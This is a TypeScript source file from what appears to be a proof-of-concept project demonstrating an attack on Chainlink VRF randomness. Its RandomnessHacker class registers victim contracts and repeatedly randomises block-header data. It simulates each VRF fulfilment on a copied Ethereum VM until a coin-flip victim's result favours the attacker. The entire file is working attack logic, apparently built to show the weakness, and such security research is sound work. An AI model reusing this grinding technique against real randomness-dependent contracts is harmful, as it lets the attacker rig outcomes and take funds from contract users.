/* eslint-disable no-param-reassign, no-await-in-loop, no-constant-condition */

import VM from 'ethereumjs-vm'
import Block from 'ethereumjs-block'
import GanacheGethApiDouble from 'ganache-core/lib/subproviders/geth_api_double'
import { BigNumber } from '@ethersproject/bignumber'
import { randomBytes } from '@ethersproject/random'
import { CONTRACT_ADDRESS } from '@evilink/constant'
import { vrfCoordinatorFactory } from '@evilink/contracts-chainlink'
import { VictimKind, Victim, ResultChecker } from './type'
import { IChainlink } from '../chainlink'
import { RandomnessRequest } from '../chainlink/type'
import FlipCoin from './flipcoin'
import {
  hexToBuffer,
  bufferToHex,
  genTxOptsFromRandom,
  copyVm,
} from '../../util/ethereum'
import logger from '../../util/logger'

class RandomnessHacker {
  static logger = logger.child({ prefix: RandomnessHacker.name })

  static async fulfillRandomness(victimBlock: Block, vm: VM, proof: string) {
    const nextHeader = new Block.Header()
    nextHeader.number = hexToBuffer(
      BigNumber.from(victimBlock.header.number).add(1).toHexString(),
    )

    const { getBlock } = vm.blockchain
    vm.blockchain.getBlock = (number, done) => {
      if (
        // @ts-ignore
        number.toNumber() ===
        BigNumber.from(victimBlock.header.number).toNumber()
      ) {
        done(undefined, victimBlock)
        return
      }
      getBlock(number, (...args) => {
        done(...args)
      })
    }
    await vm.runTx(
      await genTxOptsFromRandom(
        vrfCoordinatorFactory.interface.encodeFunctionData(
          vrfCoordinatorFactory.interface.getFunction(
            'fulfillRandomnessRequest',
          ),
          [proof],
        ),
        CONTRACT_ADDRESS.VRF_COORDINATOR,
        vm.opts.common,
        new Block([nextHeader, [], []]),
      ),
    )
  }

  private chainlink: IChainlink

  private victims: Record<string, Victim>

  private resultCheckers: Record<VictimKind, ResultChecker>

  constructor(chainlink: IChainlink) {
    this.chainlink = chainlink
    this.victims = {}
    this.resultCheckers = {
      flipcoin: new FlipCoin(),
    }

    GanacheGethApiDouble.prototype.chainlink_addVictim = (
      optionStr: string,
      callback,
    ) => {
      const victim: Victim = JSON.parse(optionStr)
      this.victims[victim.address] = victim
      callback(null, true)
    }
  }

  async hack(vm: VM, randomnessRequest: RandomnessRequest) {
    if (randomnessRequest.event.keyHash !== this.chainlink.keyHash()) {
      return
    }

    const victim = this.victims[randomnessRequest.event.senderAddress]
    if (!victim) {
      return
    }

    const { header } = randomnessRequest.block
    let attempCount = 0
    RandomnessHacker.logger.info(
      `start to hack victim, address: ${victim.address}, kind: ${victim.kind}`,
    )

    while (true) {
      attempCount += 1
      header.extraData = Buffer.from(randomBytes(32))
      RandomnessHacker.logger.info(`try hash: ${bufferToHex(header.hash())}`)

      const { packedForContractInput: proof } = this.chainlink.generateProof(
        randomnessRequest.event.preSeed,
        header.hash().toString('hex'),
        BigNumber.from(header.number).toNumber(),
      )

      const futureVm = copyVm(vm)
      await RandomnessHacker.fulfillRandomness(
        new Block([header, [], []]),
        futureVm,
        proof,
      )

      if (
        await this.resultCheckers[victim.kind].checkResult(
          copyVm(vm),
          futureVm,
          victim,
          randomnessRequest,
        )
      ) {
        break
      }
    }

    RandomnessHacker.logger.info(
      `successfully hacked with ${attempCount} attemp, hash: ${bufferToHex(
        header.hash(),
      )}`,
    )
  }
}

export default RandomnessHacker
